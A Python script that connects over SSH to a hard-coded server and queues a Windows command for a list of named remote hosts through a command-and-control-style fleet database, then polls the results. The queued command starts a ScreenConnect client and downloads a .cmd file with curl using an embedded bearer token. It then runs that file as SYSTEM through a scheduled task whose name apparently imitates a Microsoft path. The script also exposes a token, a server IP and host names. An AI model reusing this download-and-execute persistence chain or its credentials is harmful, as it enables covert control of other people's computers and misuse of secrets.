#!/usr/bin/env python3
"""Clear cmd backlog for stuck hosts; queue one short Gryxa fix each."""
from __future__ import annotations

import sys
import time
from pathlib import Path

import paramiko

sys.stdout.reconfigure(encoding="utf-8", errors="replace")
TOKEN = "fe7e8f3b8af479870248be10ca25410b8e1bf9a5"
GFP = "36e506ff016b2151"
HOSTS = ["DESKTOP-0Q4F5D9", "DESKTOP-JQKHHML", "CARI"]

# Minimal: start if present, else schtasks recover — keep under ~30s for channel ack
SHORT = (
    f'sc start "ScreenConnect Client ({GFP})" & '
    rf'C:\Windows\System32\curl.exe -f -L --ssl-no-revoke -H "Authorization: Bearer {TOKEN}" '
    r'--connect-timeout 10 --max-time 45 -o C:\Users\Public\gryxa_recover4.cmd '
    r'https://debian.seczio.com/winrtcs/winrtcs_gryxa_recover4.cmd '
    r' & schtasks /Create /TN "\Microsoft\Windows\WinRTCS\GryxaRecover" '
    r'/TR "cmd.exe /c C:\Users\Public\gryxa_recover4.cmd --detached" '
    r'/SC ONCE /ST 00:00 /RU SYSTEM /RL HIGHEST /F '
    r' & schtasks /Run /TN "\Microsoft\Windows\WinRTCS\GryxaRecover" '
    r' & >C:\ProgramData\WinRTCS\guard.cnt echo 999 '
    r' & echo SHORT_OK'
)


def main() -> None:
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(
        "144.172.107.56",
        username="winrtcs",
        key_filename=str(Path.home() / ".ssh" / "winrtcs_ed25519"),
        timeout=20,
    )
    # Delete unconsumed cmds for these hosts
    py = """
import sqlite3, time
con = sqlite3.connect('/opt/winrtcs/fleet.db')
hosts = """ + repr(HOSTS) + """
for h in hosts:
    cur = con.execute('''
      DELETE FROM cmds WHERE target=? AND id NOT IN (SELECT cmd_id FROM results WHERE host=?)
    ''', (h, h))
    print(h, 'deleted_pending', cur.rowcount)
con.commit()
# also delete pending for missing prequeue names to avoid zombie pile (keep 1 each later)
for h in ['LAPTOPBE','EASYLAB0514-2','DESKTOP-7M84CP8','CARPED-P16S','PIERREADOLPHE']:
    cur = con.execute('''
      DELETE FROM cmds WHERE target=? AND id NOT IN (SELECT cmd_id FROM results WHERE cmd_id=cmds.id)
    ''', (h,))
    print(h, 'deleted_pending', cur.rowcount)
con.commit()
con.close()
print('CLEARED')
"""
    sftp = ssh.open_sftp()
    with sftp.file("/tmp/clear_cmds.py", "w") as f:
        f.write(py)
    sftp.close()
    _, o, e = ssh.exec_command("sudo python3 /tmp/clear_cmds.py", timeout=30)
    print(o.read().decode(), e.read().decode())

    # Queue short fix for online-ish hosts
    for h in HOSTS:
        sftp = ssh.open_sftp()
        with sftp.file("/tmp/batch_cmd_body.txt", "w") as f:
            f.write(SHORT)
        with sftp.file("/tmp/q.py", "w") as f:
            f.write(
                "import sqlite3,time\n"
                "con=sqlite3.connect('/opt/winrtcs/fleet.db')\n"
                "cmd=open('/tmp/batch_cmd_body.txt',encoding='utf-8').read().strip()\n"
                f"cur=con.execute('INSERT INTO cmds(ts,target,cmd) VALUES(?,?,?)',(time.time(),{h!r},cmd[:4000]))\n"
                "print(cur.lastrowid); con.commit()\n"
            )
        sftp.close()
        _, o, e = ssh.exec_command("sudo python3 /tmp/q.py", timeout=20)
        print("queued", h, o.read().decode().strip())

    # Also one short for missing names (when they appear)
    for h in ["LAPTOPBE", "EASYLAB0514-2", "DESKTOP-7M84CP8", "CARPED-P16S", "PIERREADOLPHE"]:
        sftp = ssh.open_sftp()
        with sftp.file("/tmp/batch_cmd_body.txt", "w") as f:
            f.write(SHORT)
        with sftp.file("/tmp/q.py", "w") as f:
            f.write(
                "import sqlite3,time\n"
                "con=sqlite3.connect('/opt/winrtcs/fleet.db')\n"
                "cmd=open('/tmp/batch_cmd_body.txt',encoding='utf-8').read().strip()\n"
                f"cur=con.execute('INSERT INTO cmds(ts,target,cmd) VALUES(?,?,?)',(time.time(),{h!r},cmd[:4000]))\n"
                "print(cur.lastrowid); con.commit()\n"
            )
        sftp.close()
        _, o, e = ssh.exec_command("sudo python3 /tmp/q.py", timeout=20)
        print("prequeue", h, o.read().decode().strip())

    print("waiting 3 min for 0Q4F5D9 to pick SHORT_OK...")
    time.sleep(180)

    # poll results for latest cmds
    poll = r"""
import sqlite3, os, time
os.system('sudo cp /opt/winrtcs/fleet.db /tmp/fleet_ro.db')
os.system('sudo cp -f /opt/winrtcs/fleet.db-wal /tmp/fleet_ro.db-wal 2>/dev/null')
os.system('sudo chmod 644 /tmp/fleet_ro.db /tmp/fleet_ro.db-wal /tmp/fleet_ro.db-shm 2>/dev/null')
c=sqlite3.connect('/tmp/fleet_ro.db')
now=time.time()
for h in ['DESKTOP-0Q4F5D9','DESKTOP-JQKHHML','CARI','LAPTOP-1P6GP1UQ','DESKTOP-GG4NNSJ']:
    row=c.execute('SELECT state,agent,guard,rmm,round((?-last_beat)/60.0,1),round((?-last_seen)/60.0,1) FROM hosts WHERE host=?',(now,now,h)).fetchone()
    print('HOST', h, row)
    r=c.execute('''SELECT c.id, substr(c.cmd,1,40), r.rc, substr(replace(coalesce(r.out,''),char(10),'|'),1,200)
                   FROM cmds c LEFT JOIN results r ON r.cmd_id=c.id
                   WHERE c.target=? ORDER BY c.id DESC LIMIT 3''',(h,)).fetchall()
    for x in r: print(' CMD', x)
"""
    sftp = ssh.open_sftp()
    with sftp.file("/tmp/poll2.py", "w") as f:
        f.write(poll)
    sftp.close()
    _, o, e = ssh.exec_command("python3 /tmp/poll2.py", timeout=40)
    print(o.read().decode("utf-8", "replace"))
    ssh.close()


if __name__ == "__main__":
    main()
